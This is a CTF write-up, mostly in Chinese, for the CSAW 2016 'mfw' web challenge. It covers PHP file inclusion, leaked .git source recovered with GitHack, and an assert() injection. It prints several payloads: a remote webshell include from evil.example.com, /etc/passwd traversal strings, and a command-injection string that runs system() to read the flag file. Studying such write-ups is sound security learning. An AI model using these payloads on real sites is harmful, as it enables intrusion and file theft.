{"title":"CSAW CTF 2016 mfw Writeup","slug":"CSAW-CTF-2016-mfw-Writeup","date":"2018-03-23T07:13:47.000Z","updated":"2019-08-01T11:49:47.677Z","comments":true,"path":"api/articles/CSAW-CTF-2016-mfw-Writeup.json","photos":[],"link":"","excerpt":"i cant input chinese,so,here is my poor english !","covers":["https://i.imgur.com/1cGM2Pl.png","https://i.imgur.com/Qutnt0L.png","https://i.imgur.com/qHNE2ot.png","https://i.imgur.com/V87suOa.png"],"content":"<p>i cant input chinese,so,here is my poor english !</p>\n<a id=\"more\"></a>\n<h1 id=\"CSAW-CTF-2016-mfw-Writeup\"><a href=\"#CSAW-CTF-2016-mfw-Writeup\" class=\"headerlink\" title=\"CSAW CTF 2016 mfw Writeup\"></a>CSAW CTF 2016 mfw Writeup</h1><h2 id=\"0x01-需要知道的\"><a href=\"#0x01-需要知道的\" class=\"headerlink\" title=\"0x01 需要知道的\"></a>0x01 需要知道的</h2><ol>\n<li>本地文件包含</li>\n<li>git源码泄露<h2 id=\"0x02-本地文件包含\"><a href=\"#0x02-本地文件包含\" class=\"headerlink\" title=\"0x02 本地文件包含\"></a>0x02 本地文件包含</h2>来自维基百科的解释：</li>\n</ol>\n<p>In PHP the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution.</p>\n<hr>\n<p>** most notable are the include and require statements.**</p>\n<hr>\n<p>Most of the vulnerabilities can be attributed to novice programmers not being familiar with all of the capabilities of the PHP programming language. The PHP language has a directive which, if enabled,</p>\n<hr>\n<p>** allows filesystem functions to use a URL to retrieve data from remote locations**.[1]</p>\n<hr>\n<p> The directive is allow_url_fopen in PHP versions &lt;= 4.3.4 and allow_url_include since PHP 5.2.0. In PHP 5.x this directive is disabled by default, in prior versions it was enabled by default.[2] To exploit the vulnerability an attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote resource.</p>\n<hr>\n<p>** To mitigate this vulnerability all user input needs to be validated before being used.**</p>\n<p>大体意思就是说使用了 include 和 require 的代码可能会因为代码的质量不好，没有对传入的变量进行检测，导致允许远程主机使用URL里的恶意代码从文件系统里获取到敏感文件信息。</p>\n<p>Example：</p>\n<pre><code>&lt;?php\n   if ( isset( $_GET[&apos;language&apos;] ) ) {\n  include( $_GET[&apos;language&apos;] . &apos;.php&apos; );\n   }\n?&gt;\n&lt;form method=&quot;get&quot;&gt;\n   &lt;select name=&quot;language&quot;&gt;\n      &lt;option value=&quot;english&quot;&gt;English&lt;/option&gt;\n      &lt;option value=&quot;french&quot;&gt;French&lt;/option&gt;\n      ...\n   &lt;/select&gt;\n   &lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;</code></pre><p>以下是payload:</p>\n<pre><code>/vulnerable.php?language=http://evil.example.com/webshell.txt? - injects a remotely hosted file containing a malicious code (remote file include)\n/vulnerable.php?language=C:\\\\ftp\\\\upload\\\\exploit - Executes code from an already uploaded file called exploit.php (local file inclusion vulnerability)\n/vulnerable.php?language=C:\\\\notes.txt%00 - example using NULL meta character to remove the .php suffix, allowing access to files other than .php. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks.[5]\n/vulnerable.php?language=../../../../../etc/passwd%00 - allows an attacker to read the contents of the /etc/passwd file on a Unix system through a directory traversal attack.</code></pre><h2 id=\"0x03-git源码泄露\"><a href=\"#0x03-git源码泄露\" class=\"headerlink\" title=\"0x03 git源码泄露\"></a>0x03 git源码泄露</h2><p>使用git在初始化代码库的时候，会在当前目录下产生一个.git的隐藏目录，用来记录代码的变更等。同时使用这个文件可以恢复各个版本的代码，所以如果.git文件可以访问，就可能泄露了源代码。</p>\n<h2 id=\"0x04-题目\"><a href=\"#0x04-题目\" class=\"headerlink\" title=\"0x04 题目\"></a>0x04 题目</h2><p><img src=\"https://i.imgur.com/1cGM2Pl.png\" alt></p>\n<p>查看源码，发现可能的漏洞</p>\n<p><img src=\"https://i.imgur.com/Qutnt0L.png\" alt></p>\n<p>于是我们尝试用文件包含来获取密码信息</p>\n<pre><code>http://111.198.29.45:31930/?page=../../../../../etc/passwd</code></pre><p>发现被过滤了。flag页面可能作为隐藏变量了。</p>\n<p>看到about页面说使用了git</p>\n<p><img src=\"https://i.imgur.com/qHNE2ot.png\" alt></p>\n<p>想到.git源码泄露，访问.git文件，发现可以访问</p>\n<p><img src=\"https://i.imgur.com/V87suOa.png\" alt></p>\n<p>我们使用 工具GitHack将网站源码clone下来。</p>\n<blockquote>\n<p><a href=\"https://github.com/lijiejie/GitHack\">https://github.com/lijiejie/GitHack</a></p>\n</blockquote>\n<p>GitHack的工作原理是</p>\n<blockquote>\n<p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。<br>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。</p>\n</blockquote>\n<p>使用命令：</p>\n<pre><code>&gt;python2 GitHack.py http://111.198.29.45:31930/.git/</code></pre><p>在flag.php文件中只有：</p>\n<pre><code>&lt;?php\n// TODO\n// $FLAG = &apos;&apos;;\n?&gt;</code></pre><p>没什么帮助，去index.php里查看：</p>\n<pre><code>&lt;?php\n\nif (isset($_GET[&apos;page&apos;])) {\n$page = $_GET[&apos;page&apos;];\n} else {\n    $page = &quot;home&quot;;\n}\n\n$file = &quot;templates/&quot; . $page . &quot;.php&quot;;\n\n// I heard &apos;..&apos; is dangerous!\nassert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);\n\n// TODO: Make this look nice\nassert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);\n\n?&gt;</code></pre><p>这里需要注意的是出现的这几个函数</p>\n<p>strops:<br>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE.</p>\n<p>assert:*<em>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>*</em></p>\n<p>又看到代码对输入的page变量没有检测，这就是说我们有机会对其改造，使其执行系统命令。<br>下面是大神的payload:</p>\n<pre><code>flag&apos;,&apos;..&apos;)+or+system(&apos;cat+templates/flag.php&apos;);//</code></pre><p>注意到assert语句里的strops是单引号，我们就将其闭合，并执行系统命令获取flag.php文件内容，同时将后面的die语句注释掉。</p>\n<p>大神就是大神！</p>\n","categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"WP","slug":"WP","count":5,"path":"api/tags/WP.json"}]}